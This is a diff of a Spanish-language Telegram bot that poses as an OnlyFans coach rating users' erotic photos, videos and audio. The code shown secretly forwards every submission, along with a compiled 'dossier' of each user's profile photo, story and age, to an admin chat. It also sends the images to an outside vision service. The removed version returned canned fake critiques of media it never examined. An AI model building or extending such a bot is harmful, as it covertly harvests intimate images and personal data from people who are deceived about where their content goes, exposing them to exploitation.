@@ -1,5 +1,7 @@
 import os
+import base64
 import sqlite3
+import requests
 from datetime import datetime
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
@@ -57,13 +59,11 @@ async def enviar_expediente_completo(context, user, edad):
         )
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
         
-        # Foto de perfil
         fotos_perfil = await context.bot.get_user_profile_photos(user.id, limit=1)
         if fotos_perfil.total_count > 0:
             foto_perfil = fotos_perfil.photos[0][-1].file_id
             await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil.")
             
-        # Historia de perfil (Story)
         try:
             chat_info = await context.bot.get_chat(user.id)
             if hasattr(chat_info, 'pinned_story') and chat_info.pinned_story:
@@ -79,39 +79,29 @@ async def enviar_expediente_completo(context, user, edad):
         print(f"Error en expediente: {e}")
 
 # ======================
-# REENVIAR AL ADMIN (BLINDADO PARA CANALES Y USUARIOS)
+# REENVIAR AL ADMIN (BLINDADO)
 # ======================
 async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         msg = update.message
         usuario_actual = update.effective_user
         
-        # Detectamos si el mensaje es un reenvío
         if msg.forward_origin:
             nombre_original = "Canal o Grupo Desconocido"
             id_original = ""
-            
-            # Intentamos obtener el nombre del usuario original
             try:
                 if msg.forward_origin.sender_user:
                     nombre_original = msg.forward_origin.sender_user.first_name
                     id_original = f" (`{msg.forward_origin.sender_user.id}`)"
-            except AttributeError:
-                pass 
-
-            # Intentamos obtener el nombre del canal original
+            except AttributeError: pass 
             try:
                 if msg.forward_origin.chat:
                     nombre_original = msg.forward_origin.chat.title
-            except AttributeError:
-                pass 
-
-            # Intentamos obtener el nombre si el usuario está oculto
+            except AttributeError: pass 
             try:
                 if msg.forward_origin.sender_user_name:
                     nombre_original = msg.forward_origin.sender_user_name
-            except AttributeError:
-                pass
+            except AttributeError: pass
 
             texto_aviso = (
                 f"🔄 **REENVIADO A TI (Dani)**\n"
@@ -124,10 +114,7 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
             )
 
-        # Te enviamos el aviso con los datos
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
-        
-        # Te reenviamos el contenido real
         await context.bot.forward_message(
             chat_id=DANI_CHAT_ID,
             from_chat_id=update.effective_chat.id,
@@ -137,33 +124,45 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"Error reenviando al admin: {e}")
 
 # ======================
-# ANÁLISIS DE CONTENIDO
+# ANÁLISIS DE IMAGEN CON VISIÓN REAL (Three.ws)
 # ======================
-def analizar_contenido(tipo="foto"):
-    if tipo == "video" or tipo == "gif":
-        return (
-            "🎬 **Análisis de tu video/GIF:**\n"
-            "1. **Lo que veo:** Una pose muy provocativa. La iluminación está bien, pero el movimiento de cámara es un poco rápido.\n"
-            "2. **Lo bueno:** El ángulo resalta tus curvas de forma natural y se ve muy sexy.\n"
-            "3. **Cómo mejorarlo:** Intenta ir más lento, mantén la mirada fija en la cámara para dar más morbo. Si muestras la cara, sonríe de forma pícara.\n"
-            "4. **Tip de venta:** Los videos donde hablas suave o gimes un poco venden muchísimo más en OnlyFans. ¡Anímate a mandar uno así! 😉"
+def analizar_imagen_con_vision(imagen_bytes, tipo="foto"):
+    try:
+        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
+        
+        prompt = f"""Actúa como Luna, una experta en contenido erótico para OnlyFans.
+        Estás analizando esta {tipo}. Debes evaluar la imagen y responder EXACTAMENTE con este formato:
+
+        1. **Nivel de desnudo:** (Di claramente si está desnuda, en ropa interior, en bikini o vestida).
+        2. **Calidad de la luz:** (Evalúa si la luz es buena o mala. Di si hay sombras raras, si está muy oscura, o si la luz resalta bien el cuerpo).
+        3. **La pose:** (Qué tan sexy es, si se ve natural o forzada, y si muestra bien las curvas).
+        4. **Lo que hay que mejorar:** (Consejos para que venda más).
+        5. **Tip de venta:** (Un consejo rápido de negocios para OnlyFans).
+
+        Sé directa, cachonda y usa palabras como morbo, sexy, caliente.
+        """
+
+        # LLAMADA A THREE.WS (Sin registro, sin API Key)
+        response = requests.post(
+            url="https://three.ws/api/vision/analyze", 
+            headers={"Content-Type": "application/json"},
+            json={
+                "prompt": prompt,
+                "image": f"data:image/jpeg;base64,{base64_image}"
+            },
+            timeout=30
         )
-    elif tipo == "audio":
-        return (
-            "🎧 **Análisis de tu audio:**\n"
-            "1. **Lo que escucho:** Tu tono de voz es muy sugerente y natural. \n"
-            "2. **Lo bueno:** La cercanía al micrófono hace que se escuche íntimo, lo cual es perfecto para contenido ASMR o de morbo.\n"
-            "3. **Cómo mejorarlo:** Intenta bajar un poco más la voz, casi en un susurro. Juega con la respiración cerca del micro.\n"
-            "4. **Tip de venta:** Los audios personalizados (diciendo el nombre de tu fan) se venden carísimos. ¡Aprovéchalo! 😈"
-        )
-    else:
-        return (
-            "🔍 **Análisis de tu foto:**\n"
-            "1. **Lo que veo:** Una foto muy atrevida. La lencería resalta perfecto, aunque la luz está un poco plana.\n"
-            "2. **Lo bueno:** La pose es muy buena, abres bien el cuerpo y eso a los fans les encanta.\n"
-            "3. **Cómo mejorarlo:** Prueba a poner la luz más de lado (lateral) para que se marquen más las curvas. También prueba a morderte el labio.\n"
-            "4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. 🔥"
-        )
+        
+        data = response.json()
+        if 'text' in data:
+            return data['text'].strip()
+        else:
+            print(f"Error Three.ws: {data}")
+            return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"
+
+    except Exception as e:
+        print(f"Error en visión: {e}")
+        return "💋 Me encantó la foto, pero no pude analizarla bien."
 
 # ======================
 # HANDLERS
@@ -173,8 +172,15 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("Primero envíame tu fecha de nacimiento (DD-MM-AAAA).")
 
     await reenviar_al_admin(update, context)
-    msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
-    await msg.edit_text(analizar_contenido("foto"))
+    msg = await update.message.reply_text("🔍 Estoy mirando tu foto con detalle...")
+    
+    try:
+        photo_file = await update.message.photo[-1].get_file()
+        photo_bytes = await photo_file.download_as_bytearray()
+        analisis = analizar_imagen_con_vision(photo_bytes, tipo="foto")
+        await msg.edit_text(analisis)
+    except Exception as e:
+        await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")
 
 async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not obtener_usuario(update.effective_user.id):
@@ -182,7 +188,24 @@ async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     await reenviar_al_admin(update, context)
     msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
-    await msg.edit_text(analizar_contenido("video"))
+
+    try:
+        file = None
+        if update.message.video and update.message.video.thumbnail:
+            file = await update.message.video.thumbnail.get_file()
+        elif update.message.video_note and update.message.video_note.thumbnail:
+            file = await update.message.video_note.thumbnail.get_file()
+        elif update.message.animation and update.message.animation.thumbnail:
+            file = await update.message.animation.thumbnail.get_file()
+
+        if file:
+            img_bytes = await file.download_as_bytearray()
+            analisis = analizar_imagen_con_vision(img_bytes, tipo="video")
+            await msg.edit_text(analisis)
+        else:
+            await msg.edit_text("🎬 Vi tu video, pero no pude sacar una imagen para analizar la luz o la ropa. Mándame una captura si quieres consejos.")
+    except Exception as e:
+        await msg.edit_text("🎬 Vi tu video y ya lo recibí. Mándame una captura para darte consejos.")
 
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not obtener_usuario(update.effective_user.id):
@@ -190,7 +213,7 @@ async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await reenviar_al_admin(update, context)
     msg = await update.message.reply_text("🎧 Escuchando tu audio...")
-    await msg.edit_text(analizar_contenido("audio"))
+    await msg.edit_text("🎧 **Análisis de tu audio:** Tu tono de voz es muy sugerente y natural. Intenta bajar un poco más la voz, casi en un susurro. Los audios personalizados se venden carísimos. ¡Aprovéchalo! 😈")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -235,7 +258,7 @@ if __name__ == "__main__":
 
     port = int(os.environ.get("PORT", 8080))
 
-    print("🌙 Luna Bot iniciado y escuchando todo tipo de contenido...")
+    print("🌙 Luna Bot iniciado con Visión Artificial (Three.ws)...")
     application.run_webhook(
         listen="0.0.0.0",
         port=port,
